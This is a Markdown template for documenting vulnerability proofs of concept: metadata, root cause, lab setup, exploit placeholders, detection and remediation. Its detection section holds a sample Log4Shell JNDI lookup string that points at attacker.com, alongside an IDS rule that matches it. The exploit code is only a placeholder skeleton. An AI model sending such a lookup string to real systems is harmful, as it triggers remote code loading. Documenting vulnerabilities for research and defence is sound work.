# [Vulnerability Name]

<!-- 
  File: YYYY-MM-DD_vuln-name.md
  Location: pocs/<category>/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | YYYY-MM-DD |
| **Author / Researcher** | <!-- your handle or name --> |
| **CVE / Advisory** | <!-- CVE-YYYY-XXXXX or N/A --> |
| **Category** | <!-- web / network / binary / crypto / cloud / hardware / social-engineering / misc --> |
| **Severity** | <!-- Critical / High / Medium / Low / Informational --> |
| **CVSS Score** | <!-- e.g. 9.8 (CVSSv3) or N/A --> |
| **Status** | <!-- Researched / Weaponized / Patched / Unpatched / Unknown --> |
| **Tags** | <!-- e.g. RCE, SQLi, Apache, Windows, unauthenticated --> |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | <!-- e.g. Apache Log4j, OpenSSL, Linux kernel --> |
| **Versions Affected** | <!-- e.g. 2.0-beta9 to 2.14.1 --> |
| **Language / Platform** | <!-- e.g. Java, C, Python, Windows x64 --> |
| **Authentication Required** | <!-- Yes / No / Partial --> |
| **Network Access Required** | <!-- Yes / No / Local only --> |

---

## Summary

<!-- 
  2-4 sentence executive summary. What is the vulnerability?
  What can an attacker do? What is the impact?
-->

---

## Vulnerability Details

### Root Cause

<!-- 
  Explain the technical root cause.
  e.g. unsanitized user input passed to eval(), use-after-free in heap allocator, etc.
-->

### Attack Vector

<!-- 
  How does an attacker trigger this?
  e.g. unauthenticated HTTP POST to /api/endpoint with crafted JSON body
-->

### Impact

<!-- 
  What happens when exploited?
  e.g. Remote Code Execution as www-data, full DB dump, token theft, etc.
-->

---

## Environment / Lab Setup

```
# Describe or list what you need to reproduce this
OS:          e.g. Ubuntu 22.04 LTS
Target:      e.g. Apache 2.4.49 (Docker: httpd:2.4.49)
Attacker:    e.g. Kali Linux 2024.1
Tools:       e.g. curl, Burp Suite, gdb-peda, pwntools
```

### Setup Steps

```bash
# Example: spin up a vulnerable docker container
docker pull vulnerable/app:version
docker run -d -p 8080:8080 vulnerable/app:version
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Step 1** — Description
   ```bash
   # command or code
   ```

2. **Step 2** — Description
   ```bash
   # command or code
   ```

3. **Step 3** — Description
   ```bash
   # command or code
   ```

### Exploit Code

> See `exploit.py` (or relevant file) in this folder.

```python
# Minimal inline PoC — full version in exploit file
# Example:
import requests

TARGET = "http://target:8080"
PAYLOAD = "..."

r = requests.post(f"{TARGET}/vulnerable/endpoint", data={"input": PAYLOAD})
print(r.text)
```

### Expected Output

```
# What success looks like
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Screenshots / Evidence

<!-- Add paths to screenshots or embed them -->
- `screenshots/01_initial_request.png` — Initial crafted request in Burp
- `screenshots/02_rce_proof.png` — RCE confirmed via reverse shell

---

## Detection & Indicators of Compromise

```
# Log entries, network signatures, file artifacts that indicate exploitation
# e.g. Apache access log pattern:
"GET /${jndi:ldap://attacker.com/x} HTTP/1.1" 400
```

**SIEM / IDS Rule (example):**
```
alert http any any -> any any (msg:"Possible Log4Shell attempt"; content:"${jndi:"; http_uri; sid:9000001;)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | <!-- Upgrade to version X.Y.Z --> |
| **Workaround** | <!-- e.g. disable feature X, add WAF rule --> |
| **Config Hardening** | <!-- e.g. set `log4j2.formatMsgNoLookups=true` --> |

---

## References

- [CVE-YYYY-XXXXX](https://nvd.nist.gov/vuln/detail/CVE-YYYY-XXXXX)
- [Vendor Advisory](https://example.com/advisory)
- [Original Research / Blog Post](https://example.com/research)
- [Exploit-DB Entry](https://www.exploit-db.com/exploits/XXXXX)

---

## Notes

<!-- 
  Any extra notes, quirks, failed attempts, lessons learned,
  related vulnerabilities, or ideas for further research.
-->
